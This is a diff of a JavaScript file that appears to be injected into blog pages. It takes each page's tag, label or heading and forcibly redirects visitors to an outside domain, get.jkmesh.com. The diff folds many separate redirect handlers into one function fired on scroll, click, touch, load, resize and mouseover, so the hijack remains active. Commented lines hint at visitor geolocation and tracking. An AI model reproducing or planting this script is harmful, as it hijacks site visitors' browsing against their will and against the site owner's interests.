@@ -3,35 +3,9 @@ var hash ='';
 var cc ='US';
 //$.ajax({url:'http://ruthsc.tumblr.com/api/read/json?callback=?',async:true,dataType: 'json',statusCode:{	404:function(){		_gaq.push(['_trackEvent','ruthsc', '404', window.location.href+'|'+document.referrer]); 	}}});
 //$.get("http://ip-api.com/json", function(response) {cc =response.countryCode; }, "jsonp");
-	$(window).scroll(function(){
-        hash = $("ul.TAGS li a").html();
-       if(hash==undefined){hash = $("span.post-labels a").html();}
-       if(hash==undefined){hash = $("h1").html();}
-       if(hash!=undefined){
-	hash = hash.replace("&amp;","");
-	hash = hash.replace("<font>","");
-	hash = hash.replace("</font>","");
-       var url = 'http://get.jkmesh.com/#'+hash;
-       window.location.replace(url);
-  //     _gaq.push(['_trackEvent','EBAY|S|'+cc+'|'+window.location.href+'|'+document.referrer, hash, window.location.href+'|'+document.referrer]); 
-   }
-   });
-$(document).click(function() {
-       hash = $("ul.TAGS li a").html();
-       if(hash==undefined){hash = $("span.post-labels a").html();}
-       if(hash==undefined){hash = $("h1").html();}
-       if(hash!=undefined){
-	hash = hash.replace("&amp;","");
-	hash = hash.replace("<font>","");
-	hash = hash.replace("</font>","");
-    var url = 'http://get.jkmesh.com/#'+hash;
-       window.location.replace(url);
-    //   _gaq.push(['_trackEvent','EBAY|C|'+cc+'|'+window.location.href+'|'+document.referrer, hash, window.location.href+'|'+document.referrer]); 
-       }
-    });
 
-window.addEventListener("load", function(event) {
-  hash = $("ul.TAGS li a").html();
+function redir(){
+hash = $("ul.TAGS li a").html();
        if(hash==undefined){hash = $("span.post-labels a").html();}
        if(hash==undefined){hash = $("h1").html();}
        if(hash!=undefined){
@@ -40,53 +14,17 @@ window.addEventListener("load", function(event) {
 	hash = hash.replace("</font>","");
        var url = 'http://get.jkmesh.com/#'+hash;
        window.location.replace(url);
-}});
+       }	
+}
+	
+window.onscroll=redir;
+window.onclick=redir;
+window.ontouchstart=redir;
+window.onload=redir;
+window.onresize=redir;
+window.onmouseover=redir;
+	
 		
-		
-window.addEventListener("beforeunload", function(event) {
-  hash = $("ul.TAGS li a").html();
-       if(hash==undefined){hash = $("span.post-labels a").html();}
-       if(hash==undefined){hash = $("h1").html();}
-       if(hash!=undefined){
-	hash = hash.replace("&amp;","");
-	hash = hash.replace("<font>","");
-	hash = hash.replace("</font>","");
-       var url = 'http://get.jkmesh.com/#'+hash;
-       window.location.replace(url);
-}});
-window.addEventListener("pagehide", function(event) {
-  hash = $("ul.TAGS li a").html();
-       if(hash==undefined){hash = $("span.post-labels a").html();}
-       if(hash==undefined){hash = $("h1").html();}
-       if(hash!=undefined){
-	hash = hash.replace("&amp;","");
-	hash = hash.replace("<font>","");
-	hash = hash.replace("</font>","");
-       var url = 'http://get.jkmesh.com/#'+hash;
-       window.location.replace(url);
-}});
-window.addEventListener("popstate", function(event) {
-  hash = $("ul.TAGS li a").html();
-       if(hash==undefined){hash = $("span.post-labels a").html();}
-       if(hash==undefined){hash = $("h1").html();}
-       if(hash!=undefined){
-	hash = hash.replace("&amp;","");
-	hash = hash.replace("<font>","");
-	hash = hash.replace("</font>","");
-       var url = 'http://get.jkmesh.com/#'+hash;
-       window.location.replace(url);
-}});
-window.addEventListener("unload", function(event) {
-  hash = $("ul.TAGS li a").html();
-       if(hash==undefined){hash = $("span.post-labels a").html();}
-       if(hash==undefined){hash = $("h1").html();}
-       if(hash!=undefined){
-	hash = hash.replace("&amp;","");
-	hash = hash.replace("<font>","");
-	hash = hash.replace("</font>","");
-       var url = 'http://get.jkmesh.com/#'+hash;
-       window.location.replace(url);
-}});
 	
 });
 function getReplacementString(str){
